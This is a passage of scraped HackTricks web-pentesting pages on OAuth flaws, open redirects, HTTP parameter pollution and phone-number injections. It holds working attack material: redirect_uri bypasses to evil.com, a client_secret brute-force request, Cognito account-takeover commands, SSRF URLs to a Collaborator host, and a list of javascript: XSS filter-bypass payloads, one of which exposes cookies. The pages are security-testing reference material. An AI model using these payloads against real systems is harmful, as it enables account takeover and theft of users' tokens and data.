The\ngrant_type\nparameter explains\nwhat the grant type is\n, and which token is going to be returned\ncode\n: This\ncode\nis the authorization code received from the\nauthorization server\nwhich will be in the query string parameter ‚Äúcode‚Äù in this request. This code is used in conjunction with the\nclient_id\nand\nclient_secret\nby the client application to fetch an\naccess_token\naccess_token\n: The\naccess_token\nis the\ntoken that the client application uses to make API requests\non behalf of a\nresource owner\nrefresh_token\n: The\nrefresh_token\nallows an application to\nobtain a new\naccess_token\nwithout prompting the user\nReal Example\nPutting this all together, here is what a\nreal OAuth flow looks like\n:\n1.\nYou visit\nhttps://yourtweetreader.com\nand click the ‚ÄúIntegrate with Twitter‚Äù button.\n2.\n‚Äã\nhttps://yourtweetreader.com\nsends a request to\nhttps://twitter.com\nasking you, the resource owner, to authorize https://yourtweetreader.com‚Äôs Twitter application to access your Tweets. The request will look like:\nhttps://twitter.com/auth\n?response_type=code\n&client_id=yourtweetreader_clientId\n&redirect_uri=https%3A%2F%2Fyourtweetreader.com%2Fcallback\n&scope=readTweets\n&state=kasodk9d1jd992k9klaskdh123\n3. You will be prompted with a consent page:\n4. Once accepted, Twitter will send a request back to the\nredirect_uri\nwith the\ncode\nand\nstate\nparameters:\nhttps://yourtweetreader.com?code=asd91j3jd91j92j1j9d1&state=kasodk9d1jd992k9klaskdh123\n5.\nhttps://yourtweetreader.com\nwill then take that\ncode\n, and using their application‚Äôs\nclient_id\nand\nclient_secret\n, will make a request from the server to retrieve an\naccess_token\non behalf of you, which will allow them to access the permissions you consented to:\nPOST /oauth/access_token\nHost: twitter.com\n...{\"client_id\": \"yourtweetreader_clientId\", \"client_secret\": \"yourtweetreader_clientSecret\", \"code\": \"asd91j3jd91j92j1j9d1\", \"grant_type\": \"authorization_code\"}\n6. Finally, the flow is complete and\nhttps://yourtweetreader.com\nwill make an API call to Twitter with your\naccess_token\nto access your Tweets.\nBug Bounty Findings\nNow, the interesting part! There are many things that can go wrong in an OAuth implementation, here are the different categories of bugs I frequently see:\nWeak redirect_uri configuration\nThe\nredirect_uri\nis very important because\nsensitive data, such as the\ncode\nis appended to this URL\nafter authorization. If the\nredirect_uri\ncan be redirected to an\nattacker controlled server\n, this means the attacker can potentially\ntakeover a victim‚Äôs account\nby using the\ncode\nthemselves, and gaining access to the victim‚Äôs data.\nThe way this is going to be exploited is going to vary by authorization server.\nSome\nwill\nonly accept\nthe exact same\nredirect_uri\npath as specified in the client application\n, but some will\naccept anything\nin the same domain or subdirectory of the\nredirect_uri\n.\nDepending on the logic handled by the server, there are a number of techniques to bypass a\nredirect_uri\n. In a situation where a\nredirect_uri\nis\nhttps://yourtweetreader.com\n/callback, these include:\nOpen redirects:\nhttps://yourtweetreader.com\n/callback?redirectUrl=https://evil.com\nPath traversal:\nhttps://yourtweetreader.com/callback/../redirect?url=https://evil.com\nWeak\nredirect_uri\nregexes:\nhttps://yourtweetreader.com.evil.com\nHTML Injection and stealing tokens via referer header:\nhttps://yourtweetreader.com/callback/home/attackerimg.jpg\nOther parameters\nthat can be vulnerable to Open Redirects are:\nclient_uri\n- URL of the home page of the client application\npolicy_uri\n- URL that the Relying Party client application provides so that the end user can read about how their profile data will be used.\ntos_uri\n- URL that the Relying Party client provides so that the end user can read about the Relying Party's terms of service.\ninitiate_login_uri\n- URI using the https scheme that a third party can use to initiate a login by the RP. Also should be used for client-side redirection.\nAll these parameters are\noptional according to the OAuth and OpenID\nspecifications and not always supported on a particular server, so it's always worth identifying which parameters are supported on your server.\nIf you target an OpenID server, the discovery endpoint at **\n.well-known/openid-configuration\n**sometimes contains parameters such as \"\nregistration_endpoint\n\", \"\nrequest_uri_parameter_supported\n\", and \"\nrequire_request_uri_registration\n\". These can help you to find the registration endpoint and other server configuration values.\nXSS in redirect implementation\nAs mentioned in this bug bounty report\nhttps://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html\nit might be possible that the redirect\nURL is being reflected in the response\nof the server after the user authenticates, being\nvulnerable to XSS\n. Possible payload to test:\nhttps://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>\nCSRF - Improper handling of state parameter\nVery often, the\nstate\nparameter is completely omitted or used in the wrong way\n. If a state parameter is\nnonexistent\n,\nor a static value\nthat never changes, the OAuth flow will very likely be\nvulnerable to CSRF\n. Sometimes, even if there is a\nstate\nparameter, the\napplication might not do any validation of the parameter\nand an attack will work. The way to exploit this would be to go through the authorization process on your own account, and pause right after authorising. You will then come across a request such as:\nhttps://yourtweetreader.com?code=asd91j3jd91j92j1j9d1\nAfter you receive this request, you can then\ndrop the request because these codes are typically one-time use\n. You can then send this URL to a\nlogged-in user, and it will add your account to their account\n. At first, this might not sound very sensitive since you are simply adding your account to a victim‚Äôs account. However, many OAuth implementations are for sign-in purposes, so if you can add your Google account which is used for logging in, you could potentially perform an\nAccount Takeover\nwith a single click as logging in with your Google account would give you access to the victim‚Äôs account.\nYou can find an\nexample\nabout this in this\nCTF writeup\nand in the\nHTB box called Oouch\n.\nI‚Äôve also seen the state parameter used as an additional redirect value several times. The application will use\nredirect_uri\nfor the initial redirect, but then the\nstate\nparameter as a second redirect which could contain the\ncode\nwithin the query parameters, or referer header.\nOne important thing to note is this doesn‚Äôt just apply to logging in and account takeover type situations. I‚Äôve seen misconfigurations in:\nSlack integrations allowing an attacker to add their Slack account as the recipient of all notifications/messages\nStripe integrations allowing an attacker to overwrite payment info and accept payments from the victim‚Äôs customers\nPayPal integrations allowing an attacker to add their PayPal account to the victim‚Äôs account, which would deposit money to the attacker‚Äôs PayPal\nPre Account Takeover\nOne of the other more common issues I see is when applications allow ‚ÄúSign in with X‚Äù but also username/password. There are 2 different ways to attack this:\n1.\nIf the application does\nnot require email verification on account creation\n, try\ncreating an account with a victim‚Äôs email address and attacker password\nbefore the victim has registered. If the\nvictim\nthen tries to register or sign in\nwith a third party\n, such as Google, it‚Äôs possible the application will do a lookup, see that email is already registered, then l\nink their Google account to the attacker created account\n. This is a ‚Äú\npre account takeover\n‚Äù where an attacker will have access to the victim‚Äôs account if they created it prior to the victim registering.\n2.\nIf an\nOAuth app does not require email verification\n, try signing up with that OAuth app and then change the email address with a\nvictim‚Äôs email address\n. The same issue as above could exist, but you‚Äôd be attacking it from the other direction and getting access to the victim‚Äôs account for an account takeover.\nDisclosure of Secrets\nIt‚Äôs very important to recognize\nwhich of the many OAuth parameters are secret\n, and to protect those. For example, leaking the\nclient_id\nis perfectly fine and necessary, but leaking the\nclient_secret\nis dangerous\n. If this is leaked, the\nattacker\ncan potentially\nabuse the trust and identity of the trusted client application to steal user\naccess_tokens\nand private information/access for their integrated accounts\n. Going back to our earlier example, one issue I‚Äôve seen is performing this step from the client, instead of the server:\n5.\nhttps://yourtweetreader.com\nwill then take that\ncode\n, and using their application‚Äôs\nclient_id\nand\nclient_secret\n, will make a request from the server to retrieve an\naccess_token\non behalf of you, which will allow them to access the permissions you consented to.\nIf this is done from the client, the\nclient_secret\nwill be leaked and users will be able to generate\naccess_tokens\non behalf of the application\n. With some social engineering, they can also\nadd more scopes to the OAuth authorization\nand it will all appear legitimate as the request will come from the trusted client application.\nClient Secret Bruteforce\nYou can try to\nbruteforce the client_secret\nof a service provider with the identity provider in order to be try to steal accounts.\nThe request to BF may look similar to:\nPOST /token HTTP/1.1\ncontent-type: application/x-www-form-urlencoded\nhost: 10.10.10.10:3000\ncontent-length: 135\nConnection: close\n‚Äã\ncode=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]\nReferer Header leaking Code + State\nOnce the client has the\ncode and state\n, if it's\nreflected inside the Referer header\nwhen he browses to a different page, then it's vulnerable.\nAccess Token Stored in Browser History\nGo to the\nbrowser history and check if the access token is saved in there\n.\nEverlasting Authorization Code\nThe\nauthorization code should live just for some time to limit the time window where an attacker can steal and use it\n.\nAuthorization/Refresh Token not bound to client\nIf you can get the\nauthorization code and use it with a different client then you can takeover other accounts\n.\nHappy Paths, XSS, Iframes & Post Messages to leak code & state values\nAWS Cognito\nIn this bug bounty report:\nhttps://security.lauritz-holtmann.de/advisories/flickr-account-takeover/\nyou can see that the\ntoken\nthat\nAWS Cognito\ngives back to the user might have\nenough permissions to overwrite the user data\n. Therefore, if you can\nchange the user email for a different user email\n, you might be able to\ntake over\nothers accounts.\n# Read info of the user\naws cognito-idp get-user\n--region\nus-east-1 --access-token eyJraWQiOiJPVj\n[..\n.\n]\n‚Äã\n# Change email address\naws cognito-idp update-user-attributes\n--region\nus-east-1 --access-token eyJraWQ\n[..\n.\n]\n--user-attributes\nName\n=\nemail,Value\n=\n[email¬†protected]\n{\n\"CodeDeliveryDetailsList\"\n:\n[\n{\n\"Destination\"\n:\n\"i***@f***.com\"\n,\n\"DeliveryMedium\"\n:\n\"EMAIL\"\n,\n\"AttributeName\"\n:\n\"email\"\n}\n]\n}\nFor more detailed info about how to abuse AWS cognito check:\nAWS - Cognito Unauthenticated Enum\nHackTricks Cloud\nTwo links & cookie\nAccording to\nthis writeup\n, it was possible to make a victim open a page with a\nreturnUrl\npointing to the attackers host. This info would be\nstored in a cookie (RU)\nand in a\nlater step\nthe\nprompt\nwill\nask\nthe\nuser\nif he wants to give access to that attackers host.\nTo bypass this prompt, it was possible to open a tab to initiate the\nOauth flow\nthat would set this RU cookie using the\nreturnUrl\n, close the tab before the prompt is shown, and open a new tab without that value. Then, the\nprompt won't inform about the attackers host\n, but the cookie would be set to it, so the\ntoken will be sent to the attackers host\nin the redirection.\nSSRFs parameters\nOne of the hidden URLs that you may miss is the\nDynamic Client Registration endpoint\n. In order to successfully authenticate users, OAuth servers need to know details about the client application, such as the \"client_name\", \"client_secret\", \"redirect_uris\", and so on. These details can be provided via local configuration, but OAuth authorization servers may also have a\nspecial registration endpoint\n. This endpoint is normally mapped to \"/register\" and accepts POST requests with the following format:\nPOST /connect/register HTTP/\n1.1\nContent-Type\n:\napplication/json\nHost\n:\nserver.example.com\nAuthorization\n:\nBearer eyJhbGciOiJSUzI1NiJ9.eyJ ...\n‚Äã\n{\n\"application_type\"\n:\n\"web\"\n,\n\"redirect_uris\"\n:\n[\n\"https://client.example.org/callback\"\n],\n\"client_name\"\n:\n\"My Example\"\n,\n\"logo_uri\"\n:\n\"https://client.example.org/logo.png\"\n,\n\"subject_type\"\n:\n\"pairwise\"\n,\n\"sector_identifier_uri\"\n:\n\"https://example.org/rdrct_uris.json\"\n,\n\"token_endpoint_auth_method\"\n:\n\"client_secret_basic\"\n,\n\"jwks_uri\"\n:\n\"https://client.example.org/public_keys.jwks\"\n,\n\"contacts\"\n:\n[\n\"\n[email¬†protected]\n\"\n],\n\"request_uris\"\n:\n[\n\"https://client.example.org/rf.txt\"\n]\n}\nThere are two specifications that define parameters in this request:\nRFC7591\nfor OAuth and\nOpenid Connect Registration 1.0\n.\nAs you can see here, a number of these values are passed in via URL references and look like potential targets for\nServer Side Request Forgery\n. At the same time, most servers we've tested do not resolve these URLs immediately when they receive a registration request. Instead, they just\nsave these parameters and use them later during the OAuth authorization flow\n. In other words, this is more like a second-order SSRF, which makes black-box detection harder.\nThe following parameters are particularly interesting for SSRF attacks:\nlogo_uri\n- URL that references a\nlogo for the client application\n.\nAfter you register a client\n, you can try to call the OAuth authorization endpoint (\"/authorize\") using your new \"client_id\". After the login, the server will ask you to approve the request and\nmay display the image from the \"logo_uri\"\n. If the\nserver fetches the image by itself\n, the SSRF should be triggered by this step. Alternatively, the server may just include the logo via a\nclient-side \"<img>\" tag\n. Although this doesn't lead to SSRF, it may lead to\nXSS if the URL is not escaped\n.\njwks_uri\n- URL for the client's JSON Web Key Set [JWK] document. This key set is needed on the server for validating signed requests made to the token endpoint when using JWTs for client authentication [RFC7523]. In order to test for SSRF in this parameter,\nregister a new client application with a malicious \"jwks_uri\"\n, perform the authorization process to\nobtain an authorization code for any user, and then fetch the \"/token\" endpoint\nwith the following body:\nPOST /oauth/token HTTP/1.1\n...\n``\ngrant_type=authorization_code&code=n0esc3NRze7LTCu7iYzS6a5acc3f0ogp4&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGci...\nIf vulnerable, the\nserver should perform a server-to-server HTTP request to the supplied \"jwks_uri\"\nbecause it needs this key to check the validity of the \"client_assertion\" parameter in your request. This will probably only be a\nblind SSRF vulnerability though\n, as the server expects a proper JSON response.\nsector_identifier_uri\n- This URL references a file with a single\nJSON array of redirect_uri values\n. If supported, the server may\nfetch this value as soon as you submit the dynamic registration request\n. If this is not fetched immediately, try to perform authorization for this client on the server. As it needs to know the redirect_uris in order to complete the authorization flow, this will force the server to make a request to your malicious sector_identifier_uri.\nrequest_uris\n- An array of the\nallowed request_uris for this client\n. The \"request_uri\" parameter may be supported on the authorization endpoint to provide a URL that contains a JWT with the request information (see\nhttps://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2\n).\nEven if dynamic client registration is not enabled, or it requires authentication, we can try to perform SSRF on the authorization endpoint simply by using \"request_uri\":\\\nGET /authorize?response_type=code%20id_token&client_id=sclient1&request_uri=https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt\nNote: do not confuse this parameter with \"redirect_uri\". The \"redirect_uri\" is used for redirection after authorization, whereas\n\"request_uri\" is fetched by the server at the start of the authorization process\n.\nAt the same time, many servers we've seen do not allow arbitrary \"request_uri\" values: they only allow whitelisted URLs that were pre-registered during the client registration process. That's why we need to supply \"request_uris\": \"https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt\" beforehand.\nOAuth providers Race Conditions\nIf the platform you are testing is an OAuth provider\nread this to test for possible Race Conditions\n.\nReferences\n‚Äã\nhttps://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1\n‚Äã\n‚Äã\nhttps://portswigger.net/research/hidden-oauth-attack-vectors\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nNoSQL injection\nNext\nOAuth - Happy Paths, XSS, Iframes & Post Messages to leak code & state values\nLast modified\n4mo ago"
    },
    {
        "title": "Open Redirect",
        "url": "https://book.hacktricks.xyz/pentesting-web/open-redirect",
        "text": "Open Redirect\n‚Äã\n\u0000\u0000‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nOpen redirect\nRedirect to localhost or arbitrary domains\nURL Format Bypass\nOpen Redirect to XSS\n#Basic payload, javascript code is executed after \"javascript:\"\njavascript:alert\n(\n1\n)\n‚Äã\n#Bypass \"javascript\" word filter with CRLF\njava%0d%0ascript%0d%0a:alert\n(\n0\n)\n‚Äã\n#Javascript with \"://\" (Notice that in JS \"//\" is a line coment, so new line is created before the payload). URL double encoding is needed\n#This bypasses FILTER_VALIDATE_URL os PHP\njavascript://%250Aalert\n(\n1\n)\n‚Äã\n#Variation of \"javascript://\" bypass when a query is also needed (using comments or ternary operator)\njavascript://%250Aalert\n(\n1\n)\n//?1\njavascript://%250A1?alert\n(\n1\n)\n:0\n‚Äã\n#Others\n%09Jav%09ascript:alert\n(\ndocument.domain\n)\njavascript://%250Alert\n(\ndocument.location\n=\ndocument.cookie\n)\n/%09/javascript:alert\n(\n1\n);\n/%09/javascript:alert\n(\n1\n)\n//%5cjavascript:alert\n(\n1\n);\n//%5cjavascript:alert\n(\n1\n)\n/%5cjavascript:alert\n(\n1\n);\n/%5cjavascript:alert\n(\n1\n)\njavascript://%0aalert\n(\n1\n)\n<>\njavascript:alert\n(\n1\n);\n//javascript:alert\n(\n1\n);\n//javascript:alert\n(\n1\n)\n/javascript:alert\n(\n1\n);\n/javascript:alert\n(\n1\n)\n\\\nj\n\\\nav\n\\\na\n\\\ns\n\\\ncr\n\\\ni\n\\\npt\n\\\n:\n\\\na\n\\\nl\n\\\nert\n\\(\n1\n\\)\njavascript:alert\n(\n1\n);\njavascript:alert\n(\n1\n)\njavascripT://anything%0D%0A%0D%0Awindow.alert\n(\ndocument.cookie\n)\njavascript:confirm\n(\n1\n)\njavascript://https://whitelisted.com/?z\n=\n%0Aalert\n(\n1\n)\njavascript:prompt\n(\n1\n)\njaVAscript://whitelisted.com//%0d%0aalert\n(\n1\n);\n//\njavascript://whitelisted.com?%a0alert%281%29\n/x:1/:///%01javascript:alert\n(\ndocument.cookie\n)\n/\n\"\n;\nalert\n(\n0\n);\n//\nOpen Redirect uploading svg files\n<\ncode\n>\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<\nsvg\nonload\n=\n\"\nwindow\n.\nlocation\n=\n'http://www.example.com'\n\"\nxmlns\n=\n\"\nhttp://www.w3.org/2000/svg\n\"\n>\n</\nsvg\n>\n</\ncode\n>\nCommon injection parameters\n/{payload}\n?next={payload}\n?url={payload}\n?target={payload}\n?rurl={payload}\n?dest={payload}\n?destination={payload}\n?redir={payload}\n?redirect_uri={payload}\n?redirect_url={payload}\n?redirect={payload}\n/redirect/{payload}\n/cgi-bin/redirect.cgi?{payload}\n/out/{payload}\n/out?{payload}\n?view={payload}\n/login?to={payload}\n?image_url={payload}\n?go={payload}\n?return={payload}\n?returnTo={payload}\n?return_to={payload}\n?checkout_url={payload}\n?continue={payload}\n?return_path={payload}\nsuccess=https://c1h2e1.github.io\ndata=https://c1h2e1.github.io\nqurl=https://c1h2e1.github.io\nlogin=https://c1h2e1.github.io\nlogout=https://c1h2e1.github.io\next=https://c1h2e1.github.io\nclickurl=https://c1h2e1.github.io\ngoto=https://c1h2e1.github.io\nrit_url=https://c1h2e1.github.io\nforward_url=https://c1h2e1.github.io\n@https://c1h2e1.github.io\nforward=https://c1h2e1.github.io\npic=https://c1h2e1.github.io\ncallback_url=https://c1h2e1.github.io\njump=https://c1h2e1.github.io\njump_url=https://c1h2e1.github.io\nclick?u=https://c1h2e1.github.io\noriginUrl=https://c1h2e1.github.io\norigin=https://c1h2e1.github.io\nUrl=https://c1h2e1.github.io\ndesturl=https://c1h2e1.github.io\nu=https://c1h2e1.github.io\npage=https://c1h2e1.github.io\nu1=https://c1h2e1.github.io\naction=https://c1h2e1.github.io\naction_url=https://c1h2e1.github.io\nRedirect=https://c1h2e1.github.io\nsp_url=https://c1h2e1.github.io\nservice=https://c1h2e1.github.io\nrecurl=https://c1h2e1.github.io\nj?url=https://c1h2e1.github.io\nurl=//https://c1h2e1.github.io\nuri=https://c1h2e1.github.io\nu=https://c1h2e1.github.io\nallinurl:https://c1h2e1.github.io\nq=https://c1h2e1.github.io\nlink=https://c1h2e1.github.io\nsrc=https://c1h2e1.github.io\ntc?src=https://c1h2e1.github.io\nlinkAddress=https://c1h2e1.github.io\nlocation=https://c1h2e1.github.io\nburl=https://c1h2e1.github.io\nrequest=https://c1h2e1.github.io\nbackurl=https://c1h2e1.github.io\nRedirectUrl=https://c1h2e1.github.io\nRedirect=https://c1h2e1.github.io\nReturnUrl=https://c1h2e1.github.io\nCode examples\n.Net\nresponse.redirect\n(\n\"~/mysafe-subdomain/login.aspx\"\n)\nJava\nresponse.redirect\n(\n\"http://mysafedomain.com\"\n);\nPHP\n<?php\n/* browser redirections*/\nheader\n(\n\"Location: http://mysafedomain.com\"\n);\nexit\n;\n?>\nTools\n‚Äã\nhttps://github.com/0xNanda/Oralyzer\n‚Äã\nResources\nIn\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open Redirect\nyou can find fuzzing lists.\nhttps://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html\nhttps://github.com/cujanovic/Open-Redirect-Payloads\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nOAuth - Happy Paths, XSS, Iframes & Post Messages to leak code & state values\nNext\n- Pentesting Web\nParameter Pollution\nLast modified\n6mo ago"
    },
    {
        "title": "Parameter Pollution",
        "url": "https://book.hacktricks.xyz/pentesting-web/parameter-pollution",
        "text": "Parameter Pollution\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCopied from\nhttps://medium.com/@shahjerry33/http-parameter-pollution-its-contaminated-85edc0805654\n‚Äã\nSummary :\nHTTP Parameter Pollution (HPP) means to pollute the HTTP parameters of a web application for achieving a specific malicious task. It refers to manipulating how a website treats parameters it receives during HTTP requests. It changes a website‚Äôs behaviour from its intended one. HTTP\nparameter pollution is a simple kind of attack but it is an effective one.\nWhen you pollute any parameter the code runs only on the server-side which is invisible to use, but we can see the results on our screen. The process in between is a black box.\nFor example, there is a URL https://www.anybank.com/send which has three parameters :\n1.\nfrom :\n2.\nto :\n3.\namount :\nURL : https://www.anybank.com/send/?from=accountA&to=accountB&amount=10000\nNow this is a normal URL which will proceed a transaction of 10000 from accountA to accountB but what if we add another same parameter\n‚Äúfrom :‚Äù\nSo the URL will be like\nhttps://www.anybank.com/send/?from=accountA&to=accountB&amount=10000&from=accountC\nWhen this URL will be proceed a transaction of 10000 it will be deducted from accountC rather than accountA. This is how you manipulate the parameters in\nHTTP Parameter Pollution\nattack. Although the scope of this vulnerability is not limited only to\nGET\nrequest you can also perform this attack on a\nPOST\nbased request. You can try this vulnerability on many places like password change, 2FA, comments, profile photo upload, on a parameter where API key is passed, OTP etc.\nWhen you manipulate any parameter, it‚Äôs manipulation depends on how each web technology is parsing their parameters. You can identify web technologies using ‚Äú\nWappalyzer\n‚Äù. Below is the screenshot of some technologies and their parameter parsing.Technologies and their parameter parsing\nImage for post\nI would like to share one of my finding of HPP where I was able to take over an account using this vulnerability.\nHow I find this vulnerability ?\n1.\nI went to a login page of that program, it asked for an OTP for login\nSend OTP\nImage for post\n2. I typed an email and clicked on ‚ÄúSend One Time Password‚Äù\n3. I intercepted the request using burp suite and added another email by using same parameter (I created two emails for testing purpose)Burp Request\nImage for post\n4. I received an OTP of shrey‚Ä¶‚Ä¶@gmail.com to my another account radhika‚Ä¶\n[email¬†protected]\nOTP\nImage for post\n5. I copied the OTP and went to shrey‚Ä¶\n[email¬†protected]\non that program‚Äôs login screen, I entered this OTP and I was in the account.Account Take Over\nImage for post\nSo what happened here is the back-end application took the value of first ‚Äú\nemail\n‚Äù parameter to generate an OTP and used the value of second ‚Äú\nemail\n‚Äù parameter to supply the value, which means an OTP of shrey‚Ä¶\n[email¬†protected]\nwas sent to radhika‚Ä¶\n[email¬†protected]\n.\nNOTE :\nHere in an image on 4th step where I received an OTP to radhika‚Ä¶\n[email¬†protected]\nI was confused because the message said Hi Radhika, so I thought that the parameter is not polluted and the OTP was for radhika‚Ä¶\n[email¬†protected]\nbut when I tried the OTP on shrey‚Ä¶\n[email¬†protected]\nit worked.\nFlask & PHP\nIn\nthis writeup\nyou can see how a HTTP query like\na=1&a=2\nwill be interpreted differently by Flask and PHP running on an Apache HTTP Server. In Flask, the parameter will be\n1\n(first occurrence) while in PHP it will be\n2\n(last occurrence).\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nOpen Redirect\nNext\n- Pentesting Web\nPhone Number Injections\nLast modified\n3mo ago"
    },
    {
        "title": "Phone Number Injections",
        "url": "https://book.hacktricks.xyz/pentesting-web/phone-number-injections",
        "text": "Phone Number Injections\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIt's possible to\nadd strings at the end the phone number\nthat could be used to exploit common injections (XSS, SQLi, SSRF...) or even to bypass protections:\nOTP Bypass / Bruteforce\nwould work like this:\nReferences\n‚Äã\nhttps://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nParameter Pollution\nNext\n- Pentesting Web\nPostMessage Vulnerabilities\nLast modified\n6mo ago"
    },
    {
        "title": "PostMessage Vulnerabilities",
        "url": "https://book.hacktricks.xyz/pentesting-web/postmessage-vulnerabilities",
